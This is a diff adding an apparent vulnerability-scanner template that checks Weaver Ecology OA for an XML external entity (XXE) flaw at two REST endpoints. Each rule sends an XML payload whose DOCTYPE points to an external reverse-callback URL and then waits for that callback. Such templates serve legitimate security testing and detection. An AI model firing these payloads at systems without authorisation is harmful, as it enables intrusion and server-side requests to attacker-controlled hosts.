@@ -1,0 +1,27 @@
+name: weaver-ecology-oa-deleteuserrequestinfobyxml-xxe
+groups:
+  rules1:
+    - method: GET
+      path: "/rest/ofs/deleteUserRequestInfoByXml"
+      headers:
+        Content-Type: application/xml
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "{{reverseURL}}">
+        <M><syscode>&send;</syscode></M>
+      expression: |
+        reverse.wait(5)
+  rules2:
+    - method: GET
+      path: "/rest/ofs/ReceiveCCRequestByXml"
+      headers:
+        Content-Type: application/xml
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "{{reverseURL}}">
+        <M><syscode>&send;</syscode></M>
+      expression: |
+        reverse.wait(5)
+
+detail:
+  author: 666
